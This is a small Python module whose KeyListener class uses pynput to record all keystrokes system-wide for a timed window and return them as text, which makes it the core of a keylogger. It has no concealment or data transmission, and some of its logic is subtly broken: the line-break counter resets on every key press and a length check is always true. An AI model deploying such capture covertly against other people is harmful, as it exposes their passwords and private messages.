import time

from pynput import keyboard


class KeyListener:

    def __init__(self):
        """
        Initializes the object.
        """
        self.keys = []
        self.listener = None

    def on_press(self, key):
        """
        Adds the pressed key to the list of keys if it is a character key.

        Parameters:
            - key (Key): The key that was pressed.
        """
        try:
            cont = 0
            if hasattr(key, 'char'):
                self.keys.append(key.char)
                cont += 1
            elif hasattr(key, 'name') and key.name is not None:
                self.keys.append(f'[{key.name.upper()}]')
                cont += 1

            # Space between keys to improve readability
            if cont > 70:
                self.keys.append('\n')
                cont = 0
        except AttributeError as e:
            print(e)

    def start_listener(self):
        """
        Starts the listener thread.
        """
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_listener(self):
        """
        Stop the listener and join the listener thread.
        """
        self.listener.stop()

    def read_keys(self, timeout=60):
        """
        Reads the keys from the listener for a specified duration.

        Parameters:
            - timeout (float): The duration in seconds to wait for keys.
        
        Returns:
            - str: A string containing all the keys read from the listener.
        """
        self.start_listener()
        time.sleep(timeout)
        self.stop_listener()

        keys = self.get_keys()
        self.keys = []

        return keys

    def get_keys(self):
        keys = self.keys if len(self.keys) is not None else ''
        return ''.join(keys)
